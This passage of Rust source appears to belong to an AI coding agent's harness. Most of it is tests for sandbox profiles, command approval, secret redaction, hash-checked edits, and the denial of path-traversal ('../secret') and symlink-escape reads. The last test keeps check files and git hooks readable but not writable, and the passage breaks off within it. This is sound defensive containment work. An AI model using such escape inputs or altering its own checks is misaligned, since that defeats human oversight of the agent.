        let to_head = head_budget.saturating_sub(head.len()).min(chunk.len());
        head.extend_from_slice(&chunk[..to_head]);
        // Everything past the head goes through a window that keeps only the
        // last `tail_budget` bytes seen.
        for byte in &chunk[to_head..] {
            if tail.len() == tail_budget {
                tail.pop_front();
            }
            if tail_budget > 0 {
                tail.push_back(*byte);
            }
        }
    }
    let dropped = observed
        .saturating_sub(head.len())
        .saturating_sub(tail.len());
    // In the degenerate case there was no room for the marker either, so the
    // head is all there is and saying so would itself overflow the bound.
    let retained = if dropped == 0 || tail_budget == 0 {
        // Nothing was lost, so nothing is elided and the two halves join back
        // into exactly what was written. `truncated` still reports the loss in
        // the degenerate case; only the in-band note is absent.
        head.extend(tail);
        head
    } else {
        let mut joined = head;
        let marker = format!("\n... {dropped} bytes omitted ...\n");
        // Only what fits in the marker's own budget, so the total stays within
        // the limit however large `dropped` is.
        joined.extend_from_slice(&marker.as_bytes()[..marker.len().min(MARKER_BUDGET)]);
        joined.extend(tail);
        joined
    };
    Ok(BoundedPipe {
        truncated: dropped > 0,
        retained,
        hash: hasher.finalize().to_hex().to_string(),
    })
}
#[cfg(test)]
mod tests {
    #[cfg(target_os = "macos")]
    #[test]
    fn headless_browser_selection_uses_the_newest_runnable_installation() {
        use std::os::unix::fs::PermissionsExt;
        let cache = tempfile::tempdir().unwrap();
        assert!(super::playwright_headless_browser(cache.path()).is_none());
        let platform = if cfg!(target_arch = "aarch64") {
            "mac-arm64"
        } else {
            "mac-x64"
        };
        let install = |revision: &str, executable: bool| {
            let binary = cache.path().join(format!("chromium_headless_shell-{revision}/chrome-headless-shell-{platform}/chrome-headless-shell"));
            std::fs::create_dir_all(binary.parent().unwrap()).unwrap();
            std::fs::write(&binary, b"fixture").unwrap();
            std::fs::set_permissions(
                &binary,
                std::fs::Permissions::from_mode(if executable { 0o755 } else { 0o644 }),
            )
            .unwrap();
            binary
        };
        let older = install("2", true);
        let newer = install("10", true);
        install("20", false);
        install("invalid", true);
        assert_eq!(
            super::playwright_headless_browser(cache.path()),
            Some(newer.clone())
        );
        std::fs::remove_file(newer).unwrap();
        assert_eq!(
            super::playwright_headless_browser(cache.path()),
            Some(older)
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_browser_symlink_opens_its_real_bundle_to_the_sandbox() {
        use std::os::unix::fs::symlink;
        let root = tempfile::tempdir().unwrap();
        let bundle = root.path().join("Chrome.app");
        let binary = bundle.join("Contents/MacOS/Chrome");
        std::fs::create_dir_all(binary.parent().unwrap()).unwrap();
        std::fs::write(&binary, b"browser").unwrap();
        let link = root.path().join("chrome");
        symlink(&binary, &link).unwrap();
        assert_eq!(browser_home(&link), bundle.canonicalize().unwrap());
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn per_user_dotnet_is_readable_only_when_dotnet_is_allowed() {
        let Some(home) = std::env::var_os("HOME") else {
            return;
        };
        let root = tempfile::tempdir().unwrap();
        let mut policy = PolicyProfile::Safe.build(root.path().to_path_buf());
        let rule = format!(
            "(subpath \"{}\")",
            PathBuf::from(home).join(".dotnet").display()
        );
        policy.allow_commands = vec!["sh".into()];
        assert!(!policy.sandbox_profile().unwrap().contains(&rule));
        policy.allow_commands = vec!["dotnet".into()];
        assert!(policy.sandbox_profile().unwrap().contains(&rule));
    }

    #[test]
    fn a_dependency_fetch_is_told_from_a_test_run() {
        let args = |words: &[&str]| words.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
        for (program, words) in [
            ("npm", &["install"][..]),
            ("npm", &[][..]),
            ("pip", &["install", "-r", "requirements.txt"][..]),
            ("mvn", &["-q", "test"][..]),
            ("go", &["mod", "download"][..]),
            ("dart", &["pub", "get"][..]),
            ("cargo", &["build"][..]),
        ] {
            assert!(
                super::fetches_dependencies(program, &args(words)),
                "{program} {words:?}"
            );
        }
        for (program, words) in [
            ("npm", &["test"][..]),
            ("pytest", &["-x"][..]),
            ("python3", &["-m", "unittest"][..]),
            ("go", &["vet"][..]),
            ("make", &["test"][..]),
        ] {
            assert!(
                !super::fetches_dependencies(program, &args(words)),
                "{program} {words:?}"
            );
        }
    }

    #[test]
    fn swiftpm_is_told_not_to_nest_a_sandbox_and_nothing_else_is() {
        let args = |words: &[&str]| words.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
        assert_eq!(
            super::without_nested_sandbox("swift", &args(&["test", "--filter", "X"])),
            args(&["test", "--disable-sandbox", "--filter", "X"])
        );
        assert_eq!(
            super::without_nested_sandbox("/usr/bin/swift", &args(&["build"])),
            args(&["build", "--disable-sandbox"])
        );
        for (program, words) in [
            ("swift", &["--version"][..]),
            ("swift", &["test", "--disable-sandbox"][..]),
            ("swiftc", &["main.swift"][..]),
            ("cargo", &["test"][..]),
        ] {
            assert_eq!(
                super::without_nested_sandbox(program, &args(words)),
                args(words)
            );
        }
    }

    /// Every application's temporary directory is opened only to a workspace
    /// that runs Apple's toolchain.
    #[cfg(target_os = "macos")]
    #[test]
    fn the_per_user_temporary_directory_is_opened_only_for_apple_s_toolchain() {
        let (Some(temp), Some(_)) = (
            super::darwin_user_temp_dir(),
            std::path::Path::new(super::SEATBELT)
                .is_file()
                .then_some(()),
        ) else {
            return;
        };
        let root = tempfile::tempdir().unwrap();
        let mut policy = super::PolicyProfile::Safe.build(root.path().to_path_buf());
        let temp = temp.to_str().unwrap();
        // The exact rule: a tempdir workspace lives under that directory too.
        let rule = format!("(allow file-write* (subpath \"{temp}\"))");
        policy.allow_commands = vec!["swift".into()];
        assert!(policy.sandbox_profile().unwrap().contains(&rule));
        policy.allow_commands = vec!["cargo".into()];
        assert!(!policy.sandbox_profile().unwrap().contains(&rule));
    }

    /// Seen 2026-09-27: `sh test -- x_ranges` was asked about while the
    /// script sh would run went unshown.
    #[test]
    fn a_shell_s_script_is_part_of_the_question() {
        let root = tempfile::tempdir().unwrap();
        let mut policy = super::PolicyProfile::Safe.build(root.path().to_path_buf());
        policy.allow_commands = vec!["cargo".into()];
        let action = super::ActionProposal::RunCommand {
            executable: "sh".into(),
            args: vec![],
            stdin: Some("RUST_BACKTRACE=1 cargo test --test ranges".into()),
            cwd: None,
            outside_sandbox: false,
        };
        let (_, question) = super::unlisted_program(&action, &policy).unwrap();
        assert!(
            question.contains("reading the script `RUST_BACKTRACE=1 cargo test --test ranges`"),
            "{question}"
        );
    }

    #[test]
    fn dotnet_publish_is_a_build_and_nuget_push_is_a_publish() {
        let args = |words: &[&str]| words.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>();
        assert_eq!(
            command_approval("dotnet", &args(&["publish", "-c", "Release", "-o", "out"])),
            None
        );
        assert_eq!(
            command_approval("dotnet", &args(&["nuget", "push", "pkg.nupkg"])),
            Some(Approval::Publish)
        );
        assert_eq!(
            command_approval("npm", &args(&["publish"])),
            Some(Approval::Publish)
        );
        assert_eq!(
            command_approval("cargo", &args(&["publish"])),
            Some(Approval::Publish)
        );
    }

    #[test]
    fn recipes_follow_the_workspace_and_what_is_missing() {
        let root = tempfile::tempdir().unwrap();
        std::fs::write(root.path().join("composer.json"), "{}").unwrap();
        std::fs::create_dir_all(root.path().join("tests/Api.Tests")).unwrap();
        std::fs::write(root.path().join("tests/Api.Tests/Api.Tests.csproj"), "").unwrap();
        let recipes = toolchain_recipes(root.path(), &["php", "composer", "go"]);
        let said = recipes.join("\n");
        assert!(said.contains("dl.static-php.dev"), "{said}");
        assert!(said.contains("composer.phar"), "{said}");
        // Go is missing but nothing here is built with it; .NET is named but present.
        assert!(!said.contains("go.dev"), "{said}");
        assert!(!said.contains("dotnet-install"), "{said}");
        if cfg!(all(target_os = "macos", target_arch = "aarch64")) {
            assert!(said.contains("cli-macos-aarch64"), "{said}");
        }
        assert!(toolchain_recipes(root.path(), &[]).is_empty());
    }

    #[test]
    fn a_repeated_program_is_recognised_however_it_is_spelled() {
        let args = |words: &[&str]| {
            words
                .iter()
                .map(|word| (*word).to_owned())
                .collect::<Vec<_>>()
        };
        let given = args(&["/bin/sh", "-c", "echo hi"]);
        assert_eq!(args_after_program("/bin/sh", &given).unwrap(), &given[1..]);
        let given = args(&["/bin/sh", "-c", "echo hi"]);
        assert_eq!(args_after_program("sh", &given).unwrap(), &given[1..]);
        let given = args(&["npm", "run", "build"]);
        assert_eq!(args_after_program("npm", &given).unwrap(), &given[1..]);
        // A file that shares the program's name is an argument.
        let given = args(&["./node", "--flag"]);
        assert_eq!(args_after_program("node", &given).unwrap(), &given[..]);
        let given = args(&["scripts/sh"]);
        assert_eq!(args_after_program("sh", &given).unwrap(), &given[..]);
        assert!(args_after_program("sh", &args(&["/bin/sh"])).is_err());
    }

    #[test]
    fn a_command_run_in_a_folder_says_so_and_names_failing_files_from_the_root() {
        let root = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(root.path().join("site/src")).unwrap();
        let said = ran_in(root.path(), Some(Path::new("site"))).unwrap();
        assert!(said.starts_with("site/ -- "), "{said}");
        assert!(said.contains("`site/<file>`"), "{said}");
        // The root itself, by any spelling, needs nothing said.
        assert_eq!(ran_in(root.path(), None), None);
        assert_eq!(ran_in(root.path(), Some(Path::new("."))), None);
        assert_eq!(ran_in(root.path(), Some(root.path())), None);
        let absolute = format!("{}/site/src/app.ts (3)", root.path().display());
        assert_eq!(from_the_root(root.path(), &absolute), "site/src/app.ts (3)");
    }

    #[test]
    fn an_npm_package_unpacked_among_the_toolchains_is_not_one() {
        let root = tempfile::tempdir().unwrap();
        let base = root.path().join(TOOLCHAINS_DIRECTORY);
        std::fs::create_dir_all(base.join("package/bin")).unwrap();
        std::fs::write(base.join("package/package.json"), "{}").unwrap();
        std::fs::create_dir_all(base.join("node-v22/bin")).unwrap();
        assert_eq!(
            toolchain_paths(root.path()),
            vec![base.join("node-v22/bin")]
        );
    }

    #[test]
    fn workspace_toolchains_go_on_path_in_order() {
        let root = tempfile::tempdir().unwrap();
        let base = root.path().join(TOOLCHAINS_DIRECTORY);
        std::fs::create_dir_all(base.join("go/bin")).unwrap();
        std::fs::create_dir_all(base.join("go/pkg/tool/bin")).unwrap();
        std::fs::create_dir_all(base.join("jdk-21/Contents/Home/bin")).unwrap();
        std::fs::create_dir_all(base.join("cmake-4.1/CMake.app/Contents/bin")).unwrap();
        std::fs::create_dir_all(base.join("dotnet/sdk")).unwrap();
        std::fs::create_dir_all(base.join("empty")).unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::write(base.join("dotnet/dotnet"), "").unwrap();
            std::fs::set_permissions(
                base.join("dotnet/dotnet"),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        assert_eq!(
            toolchain_paths(root.path()),
            vec![
                base.join("cmake-4.1/CMake.app/Contents/bin"),
                base.join("dotnet"),
                base.join("go/bin"),
                base.join("jdk-21/Contents/Home/bin"),
            ]
        );
        assert!(toolchain_paths(&root.path().join("missing")).is_empty());
    }

    #[test]
    fn a_jdk_and_dotnet_in_the_workspace_get_their_homes() {
        let root = tempfile::tempdir().unwrap();
        let base = root.path().join(TOOLCHAINS_DIRECTORY);
        let jdk_bin = base.join("jdk-21/Contents/Home/bin");
        std::fs::create_dir_all(&jdk_bin).unwrap();
        std::fs::write(jdk_bin.join("javac"), "").unwrap();
        std::fs::create_dir_all(base.join("dotnet")).unwrap();
        std::fs::write(base.join("dotnet/dotnet"), "").unwrap();
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(
                base.join("dotnet/dotnet"),
                std::fs::Permissions::from_mode(0o755),
            )
            .unwrap();
        }
        let homes = toolchain_homes(root.path());
        assert!(
            homes.contains(&("JAVA_HOME", base.join("jdk-21/Contents/Home"))),
            "{homes:?}"
        );
        assert!(
            homes.contains(&("DOTNET_ROOT", base.join("dotnet"))),
            "{homes:?}"
        );
    }

    #[test]
    fn network_refusals_are_recognised_across_ecosystems() {
        for output in [
            "error NU1301: Unable to load the service index for source https://api.nuget.org/v3/index.json.",
            "npm ERR! code ENOTFOUND\nnpm ERR! network request to https://registry.npmjs.org failed",
            "fatal: unable to access 'https://github.com/x/y/': Could not resolve host: github.com",
            "go: downloading golang.org/x/mod v0.1.0: dial tcp: lookup proxy.golang.org: no such host",
            "WARNING: Retrying ... Failed to establish a new connection: [Errno 8] nodename nor servname provided",
            "[ERROR] Could not transfer artifact org.junit:junit:pom:4.13 from/to central",
        ] {
            assert!(looks_like_network_denied(output), "{output}");
        }
        for output in [
            "error[E0308]: mismatched types",
            "FAILED tests/test_sheet.py::test_x",
            "Connection refused (os error 61)",
        ] {
            assert!(!looks_like_network_denied(output), "{output}");
        }
    }

    #[test]
    fn host_facts_name_the_machine_and_how_to_install_what_it_lacks() {
        let root = tempfile::tempdir().unwrap();
        let facts = host_facts(root.path());
        assert!(facts.contains(std::env::consts::ARCH), "{facts}");
        assert!(facts.contains("Installed:"), "{facts}");
        assert!(facts.contains(".toolchains/<name>/"), "{facts}");
        if cfg!(all(target_os = "macos", target_arch = "aarch64")) {
            assert!(facts.contains("darwin-arm64"), "{facts}");
        }
    }

    use super::*;
    #[test]
    fn a_page_is_read_as_its_text() {
        let page = "<html><head><title>t</title><style>p{color:red}</style></head>\
            <body><script>var x = '<p>no</p>';</script><h1>Codice fiscale</h1>\
            <p>Il carattere di controllo &egrave; calcolato &amp; verificato.</p>\
            <table><tr><td>A</td><td>1</td></tr></table></body></html>";
        let text = html_to_text(page);
        assert!(text.contains("Codice fiscale\n"));
        assert!(text.contains("calcolato & verificato."));
        assert!(text.contains("| A | 1"));
        assert!(!text.contains("color:red"));
        assert!(!text.contains("var x"));
        assert!(!text.contains('<'));
    }

    #[test]
    fn traversal_denied() {
        let p = ToolPolicy {
            root: PathBuf::from("/tmp/root"),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 1,
            timeout: Duration::from_secs(1),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(p.resolve(Path::new("../secret")).is_err());
    }
    #[test]
    fn a_page_check_reads_the_console_from_the_browser_log() {
        let log = "[1:2:1002/151700.411471:INFO:CONSOLE:3] \"a log line\", source: http://localhost:3000/ (3)\n\
                   [1:2:1002/151700.4:WARNING:other.cc(12)] unrelated\n\
                   [1:2:1002/151700.411604:INFO:CONSOLE(7)] \"Uncaught ReferenceError: x is not defined\", source: http://localhost:3000/_next/app.js (7)\n\
                   [1:2:1002/151700.5:INFO:CONSOLE:0] \"Failed to load resource: the server responded with a status of 500 (Internal Server Error)\", source: http://localhost:3000/ (0)";
        assert_eq!(
            console_messages(log),
            vec![
                "a log line (http://localhost:3000/ (3))",
                "Uncaught ReferenceError: x is not defined (http://localhost:3000/_next/app.js (7))",
                "Failed to load resource: the server responded with a status of 500 (Internal Server Error) (http://localhost:3000/ (0))",
            ]
        );
    }

    #[test]
    fn a_page_check_reads_the_text_a_person_would() {
        let dom = "<!DOCTYPE html><html><head><title>Build Error &amp; more</title>\
                   <style>h1{color:red}</style></head><body><header>Shop</header>\
                   <h1>500</h1><p>Internal   Server\nError.</p>\
                   <script>console.log('hidden')</script><p>Caf\u{e9} &lt;ok&gt;</p></body></html>";
        let (title, text) = visible_text(dom);
        assert_eq!(title.as_deref(), Some("Build Error & more"));
        assert_eq!(text, "Shop\n500\nInternal Server\nError.\nCaf\u{e9} <ok>");
    }

    #[test]
    fn redacts() {
        let p = ToolPolicy {
            root: PathBuf::new(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 1,
            timeout: Duration::ZERO,
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(p.redact("token=abc").0.contains("REDACTED"));
    }
    /// D7, from the R2 rerun: a deployment that quotes its JSON twice sends
    /// `\n` as two characters, and twelve edits were refused for text that was
    /// in the file all along.
    #[test]
    fn an_edit_whose_find_text_carries_its_escapes_literally_still_lands() {
        let root = tempfile::tempdir().unwrap();
        let file = root.path().join("more.py");
        let before =
            "def zip_equal(*iterables):\n    \"\"\"\n    if lengths is None:\n        pass\n";
        std::fs::write(&file, before).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 64 * 1024,
            timeout: Duration::from_secs(1),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        let applied = replace_text(
            &policy,
            Path::new("more.py"),
            &hash_bytes(before.as_bytes()),
            "    if lengths is None:\\n        pass",
            "    if lengths is None:\n        return",
        )
        .expect("the decoded find text matches once");
        assert!(
            applied
                .normalized
                .as_deref()
                .is_some_and(|note| note.contains("escapes literally")),
            "the correction must be reported: {:?}",
            applied.normalized
        );
        assert!(std::fs::read_to_string(&file).unwrap().contains("return"));

        // An edit that lands literally reports no correction.
        let now = std::fs::read_to_string(&file).unwrap();
        let applied = replace_text(
            &policy,
            Path::new("more.py"),
            &hash_bytes(now.as_bytes()),
            "return",
            "raise",
        )
        .unwrap();
        assert!(applied.normalized.is_none());

        // And text that is genuinely absent is still refused, decoded or not.
        let now = std::fs::read_to_string(&file).unwrap();
        let refused = replace_text(
            &policy,
            Path::new("more.py"),
            &hash_bytes(now.as_bytes()),
            "def never_written():\\n    pass",
            "x",
        );
        assert!(matches!(refused, Err(ToolError::Denied(_))), "{refused:?}");
    }

    #[test]
    fn listing_and_searching_never_enter_a_python_virtual_environment() {
        let root = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(root.path().join(".venv/lib/site-packages/pkg")).unwrap();
        std::fs::write(
            root.path().join(".venv/lib/site-packages/pkg/mod.py"),
            "needle = 1\n",
        )
        .unwrap();
        std::fs::write(root.path().join("app.py"), "needle = 2\n").unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 64 * 1024,
            timeout: Duration::from_secs(5),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        let listed: Vec<String> = list_tree(&policy, 100)
            .unwrap()
            .into_iter()
            .map(|e| e.path)
            .collect();
        assert!(
            listed.iter().all(|path| !path.starts_with(".venv")),
            "{listed:?}"
        );
        let found = search(&policy, "needle", 30).unwrap();
        let paths: Vec<&str> = found.files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, ["app.py"]);
    }

    /// D8: seven denials in the rerun were `cat`, `grep`, `head` and `find`,
    /// each costing a turn to a read the harness does through a tool.
    #[tokio::test]
    async fn a_denied_read_only_command_names_the_tool_that_does_it() {
        let root = tempfile::tempdir().unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec!["node".into()],
            output_limit: 1024,
            timeout: Duration::from_secs(1),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        for (program, tool) in [
            ("cat", "read_file"),
            ("grep", "search"),
            ("ls", "list_tree"),
            ("find", "list_tree"),
        ] {
            let Err(ToolError::Denied(why)) =
                run_command(&policy, program, &["x".to_string()]).await
            else {
                panic!("{program} was not denied");
            };
            assert!(why.contains(tool), "{program}: {why}");
            assert!(
                why.contains("This run may execute: node"),
                "{program}: {why}"
            );
        }
        // A program with no tool equivalent is denied without an instruction
        // nobody can follow.
        let Err(ToolError::Denied(why)) =
            run_command(&policy, "cargo", &["build".to_string()]).await
        else {
            panic!("cargo was not denied");
        };
        assert!(!why.contains("read_file"), "{why}");
    }

    #[test]
    fn read_rejects_binary_and_escapes() {
        let root = tempfile::tempdir().unwrap();
        std::fs::write(root.path().join("safe.txt"), "token=secret").unwrap();
        std::fs::write(root.path().join("bad.bin"), [0u8, 1]).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100,
            timeout: Duration::ZERO,
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(read_file(&policy, Path::new("bad.bin")).is_err());
        assert!(read_file(&policy, Path::new("../safe.txt")).is_err());
        assert!(read_file(&policy, Path::new("safe.txt")).unwrap().redacted);
    }

    /// A PDF carries no NUL byte in its header, so the scan that guarded these
    /// tools passed it through as text. Measured on a real 160 KiB CV: the read
    /// returned the object graph and an encoded image stream, the caller took
    /// them for the document, and searching them for `/URI` even produced hits.
    #[test]
    fn text_tools_refuse_a_pdf_that_carries_no_nul_byte() {
        let root = tempfile::tempdir().unwrap();
        let mut pdf = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog >>\n".to_vec();
        // Past the prefix the scan looks at, and deliberately NUL-free: what is
        // being asserted is that the header alone decides it.
        pdf.extend(std::iter::repeat_n(b'A', 8192));
        assert!(
            !pdf.iter().take(4096).any(|byte| *byte == 0),
            "the fixture must be the case the NUL scan misses"
        );
        std::fs::write(root.path().join("cv.pdf"), &pdf).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100_000,
            timeout: Duration::from_secs(5),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };

        let denial = read_file(&policy, Path::new("cv.pdf"))
            .unwrap_err()
            .to_string();
        assert!(
            denial.contains("PDF"),
            "the refusal must name the format: {denial}"
        );
        assert!(
            denial.contains("prerequisite"),
            "the refusal must end the line of attempts, not invite the next one: {denial}"
        );

        // The same file must not come back as search results either: `/Type`
        // appears in the object graph and is not content the caller can use.
        let found = search(&policy, "/Type", 10).unwrap();
        assert!(
            found.files.is_empty(),
            "search must skip it too: {:?}",
            found.files
        );

        assert!(apply_replace(&policy, Path::new("cv.pdf"), "obj", "x").is_err());
    }

    /// The signature table is a supplement to the NUL scan, not a replacement:
    /// an unrecognised binary is still refused, and text is still read.
    #[test]
    fn signature_table_does_not_narrow_what_counts_as_binary() {
        let root = tempfile::tempdir().unwrap();
        std::fs::write(root.path().join("mystery.dat"), [b'x', 0u8, b'y']).unwrap();
        std::fs::write(
            root.path().join("notes.md"),
            "# %PDF- is not a header here\n",
        )
        .unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100_000,
            timeout: Duration::from_secs(5),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(read_file(&policy, Path::new("mystery.dat")).is_err());
        assert!(read_file(&policy, Path::new("notes.md")).is_ok());
    }
    #[test]
    fn replacement_requires_fresh_hash() {
        let root = tempfile::tempdir().unwrap();
        std::fs::write(root.path().join("safe.txt"), "before").unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100,
            timeout: Duration::ZERO,
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(apply_replace(&policy, Path::new("safe.txt"), "wrong", "after").is_err());
        let hash = hash_bytes("before");
        assert_eq!(
            apply_replace(&policy, Path::new("safe.txt"), &hash, "after")
                .unwrap()
                .new_hash,
            hash_bytes("after")
        );
    }
    #[cfg(unix)]
    #[test]
    fn symlink_escape_is_denied() {
        use std::os::unix::fs::symlink;
        let root = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        symlink(outside.path(), root.path().join("escape")).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100,
            timeout: Duration::ZERO,
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(policy.resolve(Path::new("escape/secret.txt")).is_err());
    }
    #[test]
    fn an_edit_shows_the_lines_it_changed_as_the_file_now_reads() {
        let before = "a\nb\nc\nd\ne\nf\ng\nh\n";
        let after = "a\nb\nc\nd\nE\nE2\nf\ng\nh\n";
        assert_eq!(
            changed_excerpt(before, after).unwrap(),
            "    2| b\n    3| c\n    4| d\n    5| E\n    6| E2\n    7| f\n    8| g\n    9| h"
        );
        assert_eq!(changed_excerpt(before, before), None);
        // A removal still shows where it was.
        assert_eq!(
            changed_excerpt("x\ny\nz\n", "x\nz\n").unwrap(),
            "    1| x\n    2| z"
        );
        let long: String = (0..100).map(|i| format!("{i}\n")).collect();
        let excerpt = changed_excerpt("", &long).unwrap();
        assert!(excerpt.ends_with("... 60 more changed lines"), "{excerpt}");
    }

    #[test]
    fn a_missing_file_is_created_by_a_whole_replacement_and_named_by_the_rest() {
        let root = tempfile::tempdir().unwrap();
        let policy = PolicyProfile::Development.build(root.path().to_path_buf());
        let created = apply_replace(&policy, Path::new("src/new.js"), "", "x\n").unwrap();
        assert!(created.normalized.unwrap().contains("did not exist"));
        assert_eq!(
            std::fs::read_to_string(root.path().join("src/new.js")).unwrap(),
            "x\n"
        );
        let refused = replace_text(&policy, Path::new("gone.js"), "", "a", "b").unwrap_err();
        assert!(
            refused.to_string().contains("gone.js does not exist"),
            "{refused}"
        );
        let refused = delete_path(&policy, Path::new("gone.js"), None, false).unwrap_err();
        assert!(
            refused.to_string().contains("nothing to delete"),
            "{refused}"
        );
    }

    #[test]
    fn a_hung_server_is_recognized_from_its_command_or_its_output() {
        let none: &[String] = &[];
        assert!(looks_like_a_server("node", &["server.js".into()], ""));
        assert!(looks_like_a_server(
            "python3",
            &["-m".into(), "http.server".into()],
            ""
        ));
        assert!(looks_like_a_server(
            "node",
            &["main.js".into()],
            "Listening on 3000"
        ));
        assert!(!looks_like_a_server("npm", &["test".into()], "1 passing"));
        assert!(!looks_like_a_server("cargo", none, ""));
    }

    #[tokio::test]
    async fn a_quoted_cwd_is_the_folder_it_names() {
        let root = tempfile::tempdir().unwrap();
        std::fs::create_dir(root.path().join("site")).unwrap();
        let mut policy = PolicyProfile::Development.build(root.path().to_path_buf());
        policy.allow_commands.push("pwd".into());
        policy.sandbox = SandboxPolicy::Disabled;
        for cwd in ["\".\"", "'site'", "\"site\""] {
            let ran = run_command_in(&policy, "pwd", &[], None, Some(cwd)).await;
            assert!(ran.is_ok(), "{cwd}: {ran:?}");
        }
    }

    #[test]
    fn a_file_url_one_folder_short_is_named_with_the_real_one() {
        let root = tempfile::tempdir().unwrap();
        let policy = PolicyProfile::Development.build(root.path().to_path_buf());
        let real = root.path().canonicalize().unwrap();
        write_file(&policy, Path::new("web/index.html"), "<p>bank</p>").unwrap();
        let test = format!("await page.goto('file://{}/index.html');\n", real.display());
        let written = write_file(&policy, Path::new("web/test.js"), &test).unwrap();
        let warning = written.warning.expect("no warning");
        assert!(
            warning.contains(&format!("file://{}/web/index.html", real.display())),
            "{warning}"
        );
        // A file that is there is not named.
        let good = format!("page.goto('file://{}/web/index.html')", real.display());
        let written = write_file(&policy, Path::new("web/ok.js"), &good).unwrap();
        assert_eq!(written.warning, None);
    }

    #[test]
    fn a_placeholder_or_a_shell_variable_in_a_file_url_is_named() {
        let root = tempfile::tempdir().unwrap();
        let policy = PolicyProfile::Development.build(root.path().to_path_buf());
        let real = root.path().canonicalize().unwrap();
        write_file(&policy, Path::new("index.html"), "<p>bank</p>").unwrap();
        for (file, url, said) in [
            (
                "a.js",
                "file:///path/to/your/project/index.html",
                "is a placeholder",
            ),
            (
                "b.js",
                "file://$PWD/index.html",
                "shell variable is not expanded",
            ),
        ] {
            let text = format!("const URL = '{url}';\n");
            let warning = write_file(&policy, Path::new(file), &text)
                .unwrap()
                .warning
                .expect("no warning");
            assert!(warning.contains(said), "{warning}");
            assert!(
                warning.contains(&format!("file://{}/index.html", real.display())),
                "{warning}"
            );
        }
    }

    #[test]
    fn npx_running_a_package_the_project_does_not_have_is_named() {
        let stderr = "npm warn exec The following package was not found and will be installed: test@3.3.0\nnpm notice run npx\n";
        let note = npx_fetched_package(stderr).unwrap();
        assert!(note.contains("`test@3.3.0`"), "{note}");
        assert_eq!(npx_fetched_package("npm notice run npx\n"), None);
    }

    #[test]
    fn a_file_importing_an_uninstalled_package_is_written_with_a_warning() {
        let root = tempfile::tempdir().unwrap();
        let policy = PolicyProfile::Development.build(root.path().to_path_buf());
        let server = "const express = require('express');\nconst fs = require('node:fs');\n\
                      const path = require('path');\nimport { z } from \"@scope/zod/v4\";\n\
                      import type { T } from 'types-only';\nconst local = require('./db');\n";
        let result = write_file(&policy, Path::new("server.js"), server).unwrap();
        let warning = result.warning.expect("no warning");
        assert!(warning.contains("`express`, `@scope/zod`"), "{warning}");
        assert!(
            warning.contains("npm install express @scope/zod"),
            "{warning}"
        );
        assert!(
            !warning.contains("types-only") && !warning.contains("db"),
            "{warning}"
        );
        // Installed, it resolves; and a file that is not JavaScript is not read.
        for package in ["express", "@scope/zod"] {
            std::fs::create_dir_all(root.path().join("node_modules").join(package)).unwrap();
        }
        let result = write_file(&policy, Path::new("app/server.js"), server).unwrap();
        assert_eq!(result.warning, None);
        let result = write_file(&policy, Path::new("notes.md"), "require('left-pad')").unwrap();
        assert_eq!(result.warning, None);
    }

    #[test]
    fn what_runs_outside_the_sandbox_can_be_read_but_not_written() {
        let root = tempfile::tempdir().unwrap();
        for dir in [".pwr", ".git/hooks", ".git/refs/heads", "sub/.git"] {
            std::fs::create_dir_all(root.path().join(dir)).unwrap();
        }
        std::fs::write(root.path().join(".pwr/checks.json"), "{}").unwrap();
        std::fs::write(root.path().join(".git/config"), "[core]\n").unwrap();
        let policy = PolicyProfile::Development.build(root.path().to_path_buf());
        for path in [
            ".pwr/checks.json",
            ".pwr/protected.json",
            ".git/hooks/pre-commit",
            ".git/config",
            "./.git/config",
            ".GIT/Hooks/post-checkout",
            "sub/.git/config",
            ".git/modules/lib/hooks/pre-push",
